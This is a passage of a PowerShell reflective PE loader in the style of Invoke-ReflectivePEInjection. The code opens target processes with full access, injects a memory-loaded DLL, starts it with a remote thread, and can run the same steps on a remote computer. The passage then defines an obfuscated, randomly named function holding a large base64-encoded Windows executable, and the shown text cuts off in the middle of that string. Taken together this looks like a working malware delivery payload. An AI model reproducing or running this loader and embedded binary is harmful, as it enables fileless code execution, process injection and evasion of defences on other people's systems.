				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}


		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero


		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}









		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}

			Write-Verbose "Got the handle for the remote process to inject in to"
		}



		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1]



		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{



	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {

				    }
					else
					{
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
					}
	            }
	        }



		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{

			}
			else{
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle


			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
			}
		}



		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{

		}
		else
		{






		}

		Write-Verbose "Done!"
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}

	Write-Verbose "PowerShell ProcessID: $PID"


	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {


		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}


	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

function Invoke-WPGPLHJSVPEOZPOJBAXMJ
{

$PEBytes32 = "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aQBhAGwAaQB6AGEAdABpAG8AbgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgAgAEkAdAAgAGkAcwAgAG0AbwBzAHQAIABsAGkAawBlAGwAeQAgAHQAaABlACAAcgBlAHMAdQBsAHQAIABvAGYAIABjAGEAbABsAGkAbgBnACAAYQBuACAATQBTAEkATAAtAGMAbwBtAHAAaQBsAGUAZAAgACgALwBjAGwAcgApACAAZgB1AG4AYwB0AGkAbwBuACAAZgByAG8AbQAgAGEAIABuAGEAdABpAHYAZQAgAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAgAG8AcgAgAGYAcgBvAG0AIABEAGwAbABNAGEAaQBuAC4ADQAKAAAAAABSADYAMAAzADIADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AYwBhAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHMAdABkAGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADUADQAKAC0AIABwAHUAcgBlACAAdgBpAHIAdAB1AGEAbAAgAGYAdQBuAGMAdABpAG8AbgAgAGMAYQBsAGwADQAKAAAAAAAAAFIANgAwADIANAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAF8AbwBuAGUAeABpAHQALwBhAHQAZQB4AGkAdAAgAHQAYQBiAGwAZQANAAoAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA3AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAG0AdQBsAHQAaQB0AGgAcgBlAGEAZAAgAGwAbwBjAGsAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAABSADYAMAAwADgADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABhAHIAZwB1AG0AZQBuAHQAcwANAAoAAAAAAAAA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